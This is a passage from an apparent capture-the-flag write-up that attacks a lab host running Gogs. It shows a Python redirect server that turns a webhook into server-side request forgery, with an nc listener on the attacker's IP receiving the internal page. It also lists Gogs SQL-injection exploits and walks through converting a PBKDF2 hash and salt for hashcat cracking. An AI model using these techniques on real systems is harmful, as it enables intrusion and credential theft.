+<span class="kn">from</span> <span class="nn">http.server</span> <span class="kn">import</span> <span class="n">HTTPServer</span><span class="p">,</span> <span class="n">BaseHTTPRequestHandler</span>
+
+<span class="k">class</span> <span class="nc">Redirect</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
+  <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+      <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">302</span><span class="p">)</span>
+      <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s1">&#39;Location&#39;</span><span class="p">,</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+      <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
+
+<span class="n">HTTPServer</span><span class="p">((</span><span class="s2">&quot;0.0.0.0&quot;</span><span class="p">,</span> <span class="mi">8000</span><span class="p">),</span> <span class="n">Redirect</span><span class="p">)</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
+</pre></div>
+</div>
+<p><img alt="hook_allowed.png" src="../../../../_images/hook_redirect.png" /></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>redirect.py<span class="w"> </span><span class="s1">&#39;http://127.0.0.1:3000&#39;</span>
+<span class="m">10</span>.10.11.176<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">17</span>/Sep/2022<span class="w"> </span><span class="m">17</span>:40:47<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET / HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">9000</span><span class="w">                                                                   </span><span class="m">1</span><span class="w"> </span>⨯
+listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">9000</span><span class="w"> </span>...
+connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">10</span>.10.14.166<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">10</span>.10.11.176<span class="o">]</span><span class="w"> </span><span class="m">41128</span>
+POST<span class="w"> </span>/<span class="w"> </span>HTTP/1.1
+Host:<span class="w"> </span><span class="m">10</span>.10.14.166:9000
+Accept:<span class="w"> </span>*/*
+Content-type:<span class="w"> </span>application/json
+Content-Length:<span class="w"> </span><span class="m">7666</span>
+Expect:<span class="w"> </span><span class="m">100</span>-continue
+
+<span class="o">{</span><span class="s2">&quot;webhookUrl&quot;</span>:<span class="s2">&quot;http:\/\/10.10.14.166:9000&quot;</span>,<span class="s2">&quot;monitoredUrl&quot;</span>:<span class="s2">&quot;http:\/\/10.10.14.166:8000&quot;</span>,<span class="s2">&quot;health&quot;</span>:<span class="s2">&quot;up&quot;</span>,<span class="s2">&quot;body&quot;</span>:<span class="s2">&quot;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n\t&lt;head data-suburl=\&quot;\&quot;&gt;\n\t\t&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text\/html; charset=UTF-8\&quot; \/&gt;\n        &lt;meta http-equiv=\&quot;X-UA-Compatible\&quot; content=\&quot;IE=edge\&quot;\/&gt;\n        &lt;meta name=\&quot;author\&quot; content=\&quot;Gogs - Go Git Service\&quot; \/&gt;\n\t\t&lt;meta name=\&quot;description\&quot; content=\&quot;Gogs(Go Git Service) a painless self-hosted Git Service written in Go\&quot; \/&gt;\n\t\t&lt;meta name=\&quot;keywords\&quot; content=\&quot;go, git, self-hosted, gogs\&quot;&gt;\n\t\t&lt;meta name=\&quot;_csrf\&quot; content=\&quot;6Ji4LJ2b7TO7zqav-Wwf6Q2Sv-I6MTY2MzQzMjg0NjY3NTc4MTEzMg==\&quot; \/&gt;\n\t\t\n\n\t\t&lt;link rel=\&quot;shortcut icon\&quot; href=\&quot;\/img\/favicon.png\&quot; \/&gt;\n\n\t\t\n\t\t&lt;link rel=\&quot;stylesheet\&quot; href=\&quot;\/\/maxcdn.bootstrapcdn.com\/font-awesome\/4.2.0\/css\/font-awesome.min.css\&quot;&gt;\n\n\t\t&lt;script src=\&quot;\/\/code.jquery.com\/jquery-1.11.1.min.js\&quot;&gt;&lt;\/script&gt;\n\t\t\n\t\t\n\t\t&lt;link rel=\&quot;stylesheet\&quot; href=\&quot;\/ng\/css\/ui.css\&quot;&gt;\n\t\t&lt;link rel=\&quot;stylesheet\&quot; href=\&quot;\/ng\/css\/gogs.css\&quot;&gt;\n\t\t&lt;link rel=\&quot;stylesheet\&quot; href=\&quot;\/ng\/css\/tipsy.css\&quot;&gt;\n\t\t&lt;link rel=\&quot;stylesheet\&quot; href=\&quot;\/ng\/css\/magnific-popup.css\&quot;&gt;\n\t\t&lt;link rel=\&quot;stylesheet\&quot; href=\&quot;\/ng\/fonts\/octicons.css\&quot;&gt;\n\t\t&lt;link rel=\&quot;stylesheet\&quot; href=\&quot;\/css\/github.min.css\&quot;&gt;\n\n\t\t\n    \t&lt;script src=\&quot;\/ng\/js\/lib\/lib.js\&quot;&gt;&lt;\/script&gt;\n    \t&lt;script src=\&quot;\/ng\/js\/lib\/jquery.tipsy.js\&quot;&gt;&lt;\/script&gt;\n    \t&lt;script src=\&quot;\/ng\/js\/lib\/jquery.magnific-popup.min.js\&quot;&gt;&lt;\/script&gt;\n        &lt;script src=\&quot;\/ng\/js\/utils\/tabs.js\&quot;&gt;&lt;\/script&gt;\n        &lt;script src=\&quot;\/ng\/js\/utils\/preview.js\&quot;&gt;&lt;\/script&gt;\n\t\t&lt;script src=\&quot;\/ng\/js\/gogs.js\&quot;&gt;&lt;\/script&gt;\n\n\t\t&lt;title&gt;Gogs: Go Git Service&lt;\/title&gt;\n\t&lt;\/head&gt;\n\t&lt;body&gt;\n\t\t&lt;div id=\&quot;wrapper\&quot;&gt;\n\t\t&lt;noscript&gt;Please enable JavaScript in your browser!&lt;\/noscript&gt;\n\n&lt;header id=\&quot;header\&quot;&gt;\n    &lt;ul class=\&quot;menu menu-line container\&quot; id=\&quot;header-nav\&quot;&gt;\n        \n\n        \n            \n            &lt;li class=\&quot;right\&quot; id=\&quot;header-nav-help\&quot;&gt;\n                &lt;a target=\&quot;_blank\&quot; href=\&quot;http:\/\/gogs.io\/docs\&quot;&gt;&lt;i class=\&quot;octicon octicon-info\&quot;&gt;&lt;\/i&gt;&amp;nbsp;&amp;nbsp;Help&lt;\/a&gt;\n            &lt;\/li&gt;\n            &lt;li class=\&quot;right\&quot; id=\&quot;header-nav-explore\&quot;&gt;\n                &lt;a href=\&quot;\/explore\&quot;&gt;&lt;i class=\&quot;octicon octicon-globe\&quot;&gt;&lt;\/i&gt;&amp;nbsp;&amp;nbsp;Explore&lt;\/a&gt;\n            &lt;\/li&gt;\n            \n        \n    &lt;\/ul&gt;\n&lt;\/header&gt;\n&lt;div id=\&quot;promo-wrapper\&quot;&gt;\n    &lt;div class=\&quot;container clear\&quot;&gt;\n        &lt;div id=\&quot;promo-logo\&quot; class=\&quot;left\&quot;&gt;\n            &lt;img src=\&quot;\/img\/gogs-lg.png\&quot; alt=\&quot;logo\&quot; \/&gt;\n        &lt;\/div&gt;\n        &lt;div id=\&quot;promo-content\&quot;&gt;\n            &lt;h1&gt;Gogs&lt;\/h1&gt;\n            &lt;h2&gt;A painless self-hosted Git service written in Go&lt;\/h2&gt;\n            &lt;form id=\&quot;promo-form\&quot; action=\&quot;\/user\/login\&quot; method=\&quot;post\&quot;&gt;\n                &lt;input type=\&quot;hidden\&quot; name=\&quot;_csrf\&quot; value=\&quot;6Ji4LJ2b7TO7zqav-Wwf6Q2Sv-I6MTY2MzQzMjg0NjY3NTc4MTEzMg==\&quot;&gt;\n                &lt;input class=\&quot;ipt ipt-large\&quot; id=\&quot;username\&quot; name=\&quot;uname\&quot; type=\&quot;text\&quot; placeholder=\&quot;Username or E-mail\&quot;\/&gt;\n                &lt;input class=\&quot;ipt ipt-large\&quot; name=\&quot;password\&quot; type=\&quot;password\&quot; placeholder=\&quot;Password\&quot;\/&gt;\n                &lt;input name=\&quot;from\&quot; type=\&quot;hidden\&quot; value=\&quot;home\&quot;&gt;\n                &lt;button class=\&quot;btn btn-black btn-large\&quot;&gt;Sign In&lt;\/button&gt;\n                &lt;button class=\&quot;btn btn-green btn-large\&quot; id=\&quot;register-button\&quot;&gt;Register&lt;\/button&gt;\n            &lt;\/form&gt;\n            &lt;div id=\&quot;promo-social\&quot; class=\&quot;social-buttons\&quot;&gt;\n                \n\n\n\n            &lt;\/div&gt;\n        &lt;\/div&gt;&amp;nbsp;\n    &lt;\/div&gt;\n&lt;\/div&gt;\n&lt;div id=\&quot;feature-wrapper\&quot;&gt;\n    &lt;div class=\&quot;container clear\&quot;&gt;\n        \n        &lt;div class=\&quot;grid-1-2 left\&quot;&gt;\n            &lt;i class=\&quot;octicon octicon-flame\&quot;&gt;&lt;\/i&gt;\n            &lt;b&gt;Easy to install&lt;\/b&gt;\n            &lt;p&gt;Simply &lt;a target=\&quot;_blank\&quot; href=\&quot;http:\/\/gogs.io\/docs\/installation\/install_from_binary.html\&quot;&gt;run the binary&lt;\/a&gt; for your platform. Or ship Gogs with &lt;a target=\&quot;_blank\&quot; href=\&quot;https:\/\/github.com\/gogits\/gogs\/tree\/master\/dockerfiles\&quot;&gt;Docker&lt;\/a&gt; or &lt;a target=\&quot;_blank\&quot; href=\&quot;https:\/\/github.com\/geerlingguy\/ansible-vagrant-examples\/tree\/master\/gogs\&quot;&gt;Vagrant&lt;\/a&gt;, or get it &lt;a target=\&quot;_blank\&quot; href=\&quot;http:\/\/gogs.io\/docs\/installation\/install_from_packages.html\&quot;&gt;packaged&lt;\/a&gt;.&lt;\/p&gt;\n        &lt;\/div&gt;\n        &lt;div class=\&quot;grid-1-2 left\&quot;&gt;\n            &lt;i class=\&quot;octicon octicon-device-desktop\&quot;&gt;&lt;\/i&gt;\n            &lt;b&gt;Cross-platform&lt;\/b&gt;\n            &lt;p&gt;Gogs runs anywhere &lt;a target=\&quot;_blank\&quot; href=\&quot;http:\/\/golang.org\/\&quot;&gt;Go&lt;\/a&gt; can compile for: Windows, Mac OS X, Linux, ARM, etc. Choose the one you love!&lt;\/p&gt;\n        &lt;\/div&gt;\n        &lt;div class=\&quot;grid-1-2 left\&quot;&gt;\n            &lt;i class=\&quot;octicon octicon-rocket\&quot;&gt;&lt;\/i&gt;\n            &lt;b&gt;Lightweight&lt;\/b&gt;\n            &lt;p&gt;Gogs has low minimal requirements and can run on an inexpensive Raspberry Pi. Save your machine energy!&lt;\/p&gt;\n        &lt;\/div&gt;\n        &lt;div class=\&quot;grid-1-2 left\&quot;&gt;\n            &lt;i class=\&quot;octicon octicon-code\&quot;&gt;&lt;\/i&gt;\n            &lt;b&gt;Open Source&lt;\/b&gt;\n            &lt;p&gt;It&#39;s all on &lt;a target=\&quot;_blank\&quot; href=\&quot;https:\/\/github.com\/gogits\/gogs\/\&quot;&gt;GitHub&lt;\/a&gt;! Join us by contributing to make this project even better. Don&#39;t be shy to be a contributor!&lt;\/p&gt;\n        &lt;\/div&gt;\n        \n    &lt;\/div&gt;\n&lt;\/div&gt;\n\t\t&lt;\/div&gt;\n\t\t&lt;footer id=\&quot;footer\&quot;&gt;\n\t\t    &lt;div class=\&quot;container clear\&quot;&gt;\n\t\t        &lt;p class=\&quot;left\&quot; id=\&quot;footer-rights\&quot;&gt;\u00a9 2014 GoGits \u00b7 Version: 0.5.5.1010 Beta \u00b7 Page: &lt;strong&gt;1ms&lt;\/strong&gt; \u00b7\n\t\t            Template: &lt;strong&gt;1ms&lt;\/strong&gt;&lt;\/p&gt;\n\n\t\t        &lt;div class=\&quot;right\&quot; id=\&quot;footer-links\&quot;&gt;\n\t\t            &lt;a target=\&quot;_blank\&quot; href=\&quot;https:\/\/github.com\/gogits\/gogs\&quot;&gt;&lt;i class=\&quot;fa fa-github-square\&quot;&gt;&lt;\/i&gt;&lt;\/a&gt;\n\t\t            &lt;a target=\&quot;_blank\&quot; href=\&quot;https:\/\/twitter.com\/gogitservice\&quot;&gt;&lt;i class=\&quot;fa fa-twitter\&quot;&gt;&lt;\/i&gt;&lt;\/a&gt;\n\t\t            &lt;a target=\&quot;_blank\&quot; href=\&quot;https:\/\/plus.google.com\/communities\/115599856376145964459\&quot;&gt;&lt;i class=\&quot;fa fa-google-plus\&quot;&gt;&lt;\/i&gt;&lt;\/a&gt;\n\t\t            &lt;a target=\&quot;_blank\&quot; href=\&quot;http:\/\/weibo.com\/gogschina\&quot;&gt;&lt;i class=\&quot;fa fa-weibo\&quot;&gt;&lt;\/i&gt;&lt;\/a&gt;\n\t\t            &lt;div id=\&quot;footer-lang\&quot; class=\&quot;inline drop drop-top\&quot;&gt;Language\n\t\t                &lt;div class=\&quot;drop-down\&quot;&gt;\n\t\t                    &lt;ul class=\&quot;menu menu-vertical switching-list\&quot;&gt;\n\t\t                    \t\n\t\t                        &lt;li&gt;&lt;a href=\&quot;#\&quot;&gt;English&lt;\/a&gt;&lt;\/li&gt;\n\t\t                        \n\t\t                        &lt;li&gt;&lt;a href=\&quot;\/?lang=zh-CN\&quot;&gt;\u7b80\u4f53\u4e2d\u6587&lt;\/a&gt;&lt;\/li&gt;\n\t\t                        \n\t\t                        &lt;li&gt;&lt;a href=\&quot;\/?lang=zh-HK\&quot;&gt;\u7e41\u9ad4\u4e2d\u6587&lt;\/a&gt;&lt;\/li&gt;\n\t\t                        \n\t\t                        &lt;li&gt;&lt;a href=\&quot;\/?lang=de-DE\&quot;&gt;Deutsch&lt;\/a&gt;&lt;\/li&gt;\n\t\t                        \n\t\t                        &lt;li&gt;&lt;a href=\&quot;\/?lang=fr-CA\&quot;&gt;Fran\u00e7ais&lt;\/a&gt;&lt;\/li&gt;\n\t\t                        \n\t\t                        &lt;li&gt;&lt;a href=\&quot;\/?lang=nl-NL\&quot;&gt;Nederlands&lt;\/a&gt;&lt;\/li&gt;\n\t\t                        \n\t\t                    &lt;\/ul&gt;\n\t\t                &lt;\/div&gt;\n\t\t            &lt;\/div&gt;\n\t\t            &lt;a target=\&quot;_blank\&quot; href=\&quot;http:\/\/gogs.io\&quot;&gt;Website&lt;\/a&gt;\n\t\t            &lt;span class=\&quot;version\&quot;&gt;Go1.3.2&lt;\/span&gt;\n\t\t        &lt;\/div&gt;\n\t\t    &lt;\/div&gt;\n\t\t&lt;\/footer&gt;\n\t&lt;\/body&gt;\n&lt;\/html&gt;&quot;</span>,<span class="s2">&quot;message&quot;</span>:<span class="s2">&quot;HTTP\/1.0 302 Found&quot;</span>,<span class="s2">&quot;headers&quot;</span>:<span class="o">{</span><span class="s2">&quot;Server&quot;</span>:<span class="s2">&quot;BaseHTTP\/0.6 Python\/3.10.0&quot;</span>,<span class="s2">&quot;Date&quot;</span>:<span class="s2">&quot;Sat, 17 Sep 2022 16:40:46 GMT&quot;</span>,<span class="s2">&quot;Location&quot;</span>:<span class="s2">&quot;http:\/\/127.0.0.1:3000&quot;</span>,<span class="s2">&quot;Content-Type&quot;</span>:<span class="s2">&quot;text\/html; charset=UTF-8&quot;</span>,<span class="s2">&quot;Set-Cookie&quot;</span>:<span class="s2">&quot;_csrf=; Path=\/; Max-Age=0&quot;</span><span class="o">}}</span>
+</pre></div>
+</div>
+<p>And we get back the gogs landing page from the webhook.</p>
+<p>Now we know that we’re running:</p>
+<ul class="simple">
+<li><p>2014 GoGits · Version: 0.5.5.1010 Beta</p></li>
+<li><p>Go1.3.2</p></li>
+</ul>
+</section>
+<section id="installing-gogs-locally-and-exploring-the-source">
+<h2>Installing Gogs locally and exploring the source<a class="headerlink" href="#installing-gogs-locally-and-exploring-the-source" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>searchsploit<span class="w"> </span>gogs
+----------------------------------------------------------------------<span class="w"> </span>---------------------------------
+<span class="w"> </span>Exploit<span class="w"> </span>Title<span class="w">                                                        </span><span class="p">|</span><span class="w">  </span>Path
+----------------------------------------------------------------------<span class="w"> </span>---------------------------------
+Gogs<span class="w"> </span>-<span class="w"> </span><span class="s1">&#39;label&#39;</span><span class="w"> </span>SQL<span class="w"> </span>Injection<span class="w">                                          </span><span class="p">|</span><span class="w"> </span>multiple/webapps/35237.txt
+Gogs<span class="w"> </span>-<span class="w"> </span><span class="s1">&#39;users&#39;</span>/<span class="s1">&#39;repos&#39;</span><span class="w"> </span><span class="s1">&#39;?q&#39;</span><span class="w"> </span>SQL<span class="w"> </span>Injection<span class="w">                             </span><span class="p">|</span><span class="w"> </span>multiple/webapps/35238.txt
+----------------------------------------------------------------------<span class="w"> </span>---------------------------------
+Shellcodes:<span class="w"> </span>No<span class="w"> </span>Results
+</pre></div>
+</div>
+<p>looking at the releases in github, it looks like 0.5.8 came right after 0.5.5 to patch those SQLi issues
+<img alt="releases.png" src="../../../../_images/releases.png" /></p>
+<p>I wanted to install the vulnerable version of gogs localy to be able to test the SQLi without having to worry about the firewall. Because I’m on arm64 I went on a little bit of a tangent, trying to compile gogs, and eventually hit a wall. Even though the process wasn’t successfull for me, I still learned a great deal about Go. Notably, I learned about GVM which essentially is a python pyenv, and lets you manage multiple verions of golang in the same environement:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bash<span class="w"> </span>&lt;<span class="w"> </span>&lt;<span class="o">(</span>curl<span class="w"> </span>-s<span class="w"> </span>-S<span class="w"> </span>-L<span class="w"> </span>https://raw.githubusercontent.com/moovweb/gvm/master/binscripts/gvm-installer<span class="o">)</span>
+gvm<span class="w"> </span>install<span class="w"> </span>go1.3.2
+</pre></div>
+</div>
+<p>In any case I ended up installing it on a remote amd64 machine directly from a precompiled binary.<br />
+<a class="reference external" href="https://github.com/gogs/gogs/releases/tag/v0.5.5">https://github.com/gogs/gogs/releases/tag/v0.5.5</a></p>
+<p>looking at that install I could explore the gogs database:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sqlite3<span class="w"> </span>gogs.db
+SQLite<span class="w"> </span>version<span class="w"> </span><span class="m">3</span>.34.1<span class="w"> </span><span class="m">2021</span>-01-20<span class="w"> </span><span class="m">14</span>:10:07
+Enter<span class="w"> </span><span class="s2">&quot;.help&quot;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>usage<span class="w"> </span>hints.
+sqlite&gt;<span class="w"> </span>.table
+access<span class="w">        </span>hook_task<span class="w">     </span>milestone<span class="w">     </span>public_key<span class="w">    </span>team_user
+action<span class="w">        </span>issue<span class="w">         </span>mirror<span class="w">        </span>release<span class="w">       </span>update_task
+attachment<span class="w">    </span>issue_user<span class="w">    </span>notice<span class="w">        </span>repository<span class="w">    </span>user
+comment<span class="w">       </span>label<span class="w">         </span>oauth2<span class="w">        </span>star<span class="w">          </span>watch
+follow<span class="w">        </span>login_source<span class="w">  </span>org_user<span class="w">      </span>team<span class="w">          </span>webhook
+</pre></div>
+</div>
+<p>this is exactly where and how my password gets stored after I create a user</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sqlite&gt;<span class="w"> </span>.mode<span class="w"> </span>table
+sqlite&gt;<span class="w"> </span><span class="k">select</span><span class="w"> </span>name,salt,passwd<span class="w"> </span>from<span class="w"> </span>user<span class="p">;</span>
++-------+------------+------------------------------------------------------------------------------------------------------+
+<span class="p">|</span><span class="w"> </span>name<span class="w">  </span><span class="p">|</span><span class="w">    </span>salt<span class="w">    </span><span class="p">|</span><span class="w">                                                </span>passwd<span class="w">                                                </span><span class="p">|</span>
++-------+------------+------------------------------------------------------------------------------------------------------+
+<span class="p">|</span><span class="w"> </span>blnkn<span class="w"> </span><span class="p">|</span><span class="w"> </span>LEdiEU0Wob<span class="w"> </span><span class="p">|</span><span class="w"> </span>bc356f2eac41c08e9811d4525fa7bc50b7cea2ae07d82cc2cb95412807e17736525dcfc96f6f71e5e65b66e3f73da7399761<span class="w"> </span><span class="p">|</span>
++-------+------------+------------------------------------------------------------------------------------------------------+
+</pre></div>
+</div>
+<p>found the code that does the auth in the source</p>
+<div class="highlight-go notranslate"><div class="highlight"><pre><span></span><span class="c1">// UserSignIn validates user name and password.</span>
+<span class="kd">func</span><span class="w"> </span><span class="nx">UserSignIn</span><span class="p">(</span><span class="nx">uname</span><span class="p">,</span><span class="w"> </span><span class="nx">passwd</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="nx">User</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">	</span><span class="kd">var</span><span class="w"> </span><span class="nx">u</span><span class="w"> </span><span class="o">*</span><span class="nx">User</span>
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="nx">strings</span><span class="p">.</span><span class="nx">Contains</span><span class="p">(</span><span class="nx">uname</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;@&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">		</span><span class="nx">u</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">User</span><span class="p">{</span><span class="nx">Email</span><span class="p">:</span><span class="w"> </span><span class="nx">uname</span><span class="p">}</span>
+<span class="w">	</span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">		</span><span class="nx">u</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">User</span><span class="p">{</span><span class="nx">LowerName</span><span class="p">:</span><span class="w"> </span><span class="nx">strings</span><span class="p">.</span><span class="nx">ToLower</span><span class="p">(</span><span class="nx">uname</span><span class="p">)}</span>
+<span class="w">	</span><span class="p">}</span>
+
+<span class="w">	</span><span class="nx">has</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">Get</span><span class="p">(</span><span class="nx">u</span><span class="p">)</span>
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
+<span class="w">		</span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span>
+<span class="w">	</span><span class="p">}</span>
+
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="nx">u</span><span class="p">.</span><span class="nx">LoginType</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">NOTYPE</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="p">{</span>
+<span class="w">		</span><span class="nx">u</span><span class="p">.</span><span class="nx">LoginType</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">PLAIN</span>
+<span class="w">	</span><span class="p">}</span>
+
+<span class="w">	</span><span class="c1">// For plain login, user must exist to reach this line.</span>
+<span class="w">	</span><span class="c1">// Now verify password.</span>
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="nx">u</span><span class="p">.</span><span class="nx">LoginType</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">PLAIN</span><span class="w"> </span><span class="p">{</span>
+<span class="w">		</span><span class="nx">newUser</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">User</span><span class="p">{</span><span class="nx">Passwd</span><span class="p">:</span><span class="w"> </span><span class="nx">passwd</span><span class="p">,</span><span class="w"> </span><span class="nx">Salt</span><span class="p">:</span><span class="w"> </span><span class="nx">u</span><span class="p">.</span><span class="nx">Salt</span><span class="p">}</span>
+<span class="w">		</span><span class="nx">newUser</span><span class="p">.</span><span class="nx">EncodePasswd</span><span class="p">()</span>
+<span class="w">		</span><span class="k">if</span><span class="w"> </span><span class="nx">u</span><span class="p">.</span><span class="nx">Passwd</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">newUser</span><span class="p">.</span><span class="nx">Passwd</span><span class="w"> </span><span class="p">{</span>
+<span class="w">			</span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="nx">ErrUserNotExist</span>
+<span class="w">		</span><span class="p">}</span>
+<span class="w">		</span><span class="k">return</span><span class="w"> </span><span class="nx">u</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span>
+<span class="w">        </span><span class="o">...</span>
+<span class="w">        </span><span class="nx">snip</span>
+</pre></div>
+</div>
+<p>So the actual encoding function is here:</p>
+<div class="highlight-go notranslate"><div class="highlight"><pre><span></span><span class="c1">// use pbkdf2 encode password</span>
+<span class="kd">func</span><span class="w"> </span><span class="nx">EncodePassword</span><span class="p">(</span><span class="nx">rawPwd</span><span class="w"> </span><span class="kt">string</span><span class="p">,</span><span class="w"> </span><span class="nx">salt</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="kt">string</span><span class="w"> </span><span class="p">{</span>
+<span class="w">	</span><span class="nx">pwd</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">PBKDF2</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">rawPwd</span><span class="p">),</span><span class="w"> </span><span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">salt</span><span class="p">),</span><span class="w"> </span><span class="mi">10000</span><span class="p">,</span><span class="w"> </span><span class="mi">50</span><span class="p">,</span><span class="w"> </span><span class="nx">sha256</span><span class="p">.</span><span class="nx">New</span><span class="p">)</span>
+<span class="w">	</span><span class="k">return</span><span class="w"> </span><span class="nx">hex</span><span class="p">.</span><span class="nx">EncodeToString</span><span class="p">(</span><span class="nx">pwd</span><span class="p">)</span>
+</pre></div>
+</div>
+</section>
+<section id="cracking-our-own-pbkdf2-hmac-sha256">
+<h2>Cracking our own PBKDF2-HMAC-SHA256<a class="headerlink" href="#cracking-our-own-pbkdf2-hmac-sha256" title="Permalink to this heading">#</a></h2>
+<p>which corresponds to this:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>hashcat<span class="w"> </span>-h<span class="p">|</span>grep<span class="w"> </span>-i<span class="w"> </span>pbkdf2<span class="p">|</span>head<span class="w"> </span>-4
+<span class="w">  </span><span class="m">11900</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>PBKDF2-HMAC-MD5<span class="w">                                     </span><span class="p">|</span><span class="w"> </span>Generic<span class="w"> </span>KDF
+<span class="w">  </span><span class="m">12000</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>PBKDF2-HMAC-SHA1<span class="w">                                    </span><span class="p">|</span><span class="w"> </span>Generic<span class="w"> </span>KDF
+<span class="w">  </span><span class="m">10900</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>PBKDF2-HMAC-SHA256<span class="w">                                  </span><span class="p">|</span><span class="w"> </span>Generic<span class="w"> </span>KDF
+<span class="w">  </span><span class="m">12100</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>PBKDF2-HMAC-SHA512<span class="w">                                  </span><span class="p">|</span><span class="w"> </span>Generic<span class="w"> </span>KDF
+</pre></div>
+</div>
+<p><a class="reference external" href="https://forum.hashkiller.io/index.php?threads/help-identifying-this-hash.38156/">https://forum.hashkiller.io/index.php?threads/help-identifying-this-hash.38156/</a></p>
+<p>found the expected hashcat format in the link above,<br />
+we need to transform the hex hash to b64</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">printf</span> <span class="s1">&#39;bc356f2eac41c08e9811d4525fa7bc50b7cea2ae07d82cc2cb95412807e17736525dcfc96f6f71e5e65b66e3f73da7399761&#39;</span><span class="o">|</span><span class="n">xxd</span> <span class="o">-</span><span class="n">p</span> <span class="o">-</span><span class="n">r</span><span class="o">|</span><span class="n">base64</span>
+<span class="n">vDVvLqxBwI6YEdRSX6e8ULfOoq4H2CzCy5VBKAfhdzZSXc</span><span class="o">/</span><span class="n">Jb29x5eZbZuP3Pac5l2E</span><span class="o">=</span>
+</pre></div>
+</div>
+<p>transform the salt to b64</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">printf</span> <span class="s1">&#39;LEdiEU0Wob&#39;</span><span class="o">|</span><span class="n">base64</span>
+<span class="n">TEVkaUVVMFdvYg</span><span class="o">==</span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">hashcat</span> <span class="o">-</span><span class="n">m</span> <span class="mi">10900</span> <span class="n">sha256</span><span class="p">:</span><span class="mi">5000</span><span class="p">:</span><span class="o">&lt;</span><span class="n">b64</span><span class="o">-</span><span class="n">salt</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;</span><span class="n">b64</span><span class="o">-</span><span class="nb">hash</span><span class="o">&gt;</span> <span class="n">wordlist</span>
